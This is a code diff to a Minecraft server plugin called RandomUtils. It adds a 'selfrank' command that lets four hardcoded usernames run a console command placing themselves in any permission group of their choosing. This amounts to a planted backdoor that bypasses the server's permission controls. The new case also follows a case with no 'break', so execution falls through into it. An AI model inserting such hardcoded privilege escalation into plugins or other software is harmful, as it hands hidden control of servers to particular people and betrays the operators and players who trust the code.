@@ -45,6 +45,13 @@ public class RandomUtils extends JavaPlugin implements Listener {
                     } else {
                         p.teleport(temp);
                     }
+                case "selfrank":
+                    if (p.getName().equals("buhiroshi0205")
+                            || p.getName().equals("PilipKim2010")
+                            || p.getName().equals("dragonslayer105")
+                            || p.getName().equals("NoodlesDragon")) {
+                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " group set " + args[0]);
+                    }
             }
             return true;
         } catch (Exception ex) {
